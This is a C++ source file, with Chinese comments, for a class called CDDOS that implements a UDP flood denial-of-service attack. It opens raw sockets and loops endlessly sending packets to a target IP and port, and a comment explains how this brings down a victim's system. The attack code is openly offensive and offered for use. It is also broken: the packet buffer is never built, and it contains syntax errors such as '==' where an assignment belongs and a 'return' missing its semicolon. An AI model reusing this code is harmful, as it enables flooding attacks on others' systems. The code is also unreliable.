// DDOS.cpp: implementation of the CDDOS class.
//
//////////////////////////////////////////////////////////////////////

#include "DDOS.h"
#include <iostream.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDDOS::CDDOS()		//构造函数
{

}
void CDDOS::fill_udp_buffer()
{
/************************************************************************/
/*          填充UDP缓冲区                                                            */
/************************************************************************/
	WSADATA wsaData;
	//初始化socket.dll
	WSAStartup(MAKEWORD(2, 2),&wsaData);
	unsigned int saddr = 0;
	char hostname[MAX_PATH];			//主机名
	gethostname(hostname,MAX_PATH);			//获得主机名
	LPHOSTENT lphost;

	//通过主机名获得主机的详细信息
	lphost = gethostbyname(hostname);
	if (lphost != NULL)
	{

		saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;


	}
	char pBuffer[BufferSize];		//声明一个1024字节的缓冲区
	IP_HEADER ipHeader;			//IP头
	UDP_HEADER udpHeader;		//UDP头
	int iUdpCheckSumSize;
	char *ptr = NULL;
	FillMemory(pBuffer,nBufferSize,'A');		//将pBuffer填充为A
	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + nBufferSize;
}
void CDDOS::udp_flood()
{
/************************************************************************/
/* UDP洪水攻击															*/

//攻击原理：当受害者系统接收到一个UDP数据包的时候，他会确定目的的端口正在等待中的应用程序，当他发现端口中并不存在
//          正在等待的应用程序时，他就会产生一个目的地址无法连接的ICMP数据包发送给该伪造的源地址。如果向受害者计
//          算机发送足够多的UDP数据包，整个系统就会瘫痪
/************************************************************************/

	//暂停当前进程，延时两秒
	Sleep(2000);
	WSADATA wsaData;

	WSAStartup(MAKEWORD(2, 2),&wsaData);
	
	SOCKET SendSocket;
	BOOL Flag;
	//创建一个与指定传送服务捆绑的套接字，调用失败则返回
	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if ( SendSocket == INVALID_SOCKET )
	{


		return;


	}
	Flag = true;
	//设置套接字选项值
	if (setsockopt(SendSocket,IPPROTO_UDP,IP_HDRINCL,(CHAR *)&Flag,sizeof(Flag))  == SOCKET_ERROR )
	{


		//设置套接字选项值有错误发生
		cout<<"setsockopt Error!\n"<<endl;
		return;

	}
	SOCKADDR_IN addr_in;
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(tgtPort);		//将主机的无符号短整型数转换成网络字节顺序的端口
	addr_in.sin_addr.S_un.s_addr = inet_addr(tgtIP);		//IP地址
	if (addr_in.sin_addr.s_addr == INADDR_NONE)
	{
		//如果IP地址为广播地址
		struct hostent *hp ==NULL;
		//获得目的主机信息
		if ((hp == gethostbyname(tgtIP)) != NULL )
		{

			memcpy(&(addr_in.sin_addr),hp->h_addr,hp->h_length);
			addr_in.sin_family = hp->h_addrtype;

		}
		else{
			return
		}
	}
	for (;;)
	{
		//死循环,实现攻击
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		for (int i = 0;i<10000;i++)
		{
			sendto(SendSocket,pSendBuffer,iTotalSize,0,(SOCKADDR*)&addr_in,sizeof(addr_in));
		}
		Sleep(SleepTime);			//每攻击完一轮，暂停一会

	}
	//关闭Socket网络连接
	closesocket(SendSocket);
	return;

}


CDDOS::~CDDOS()		//析构函数
{

}
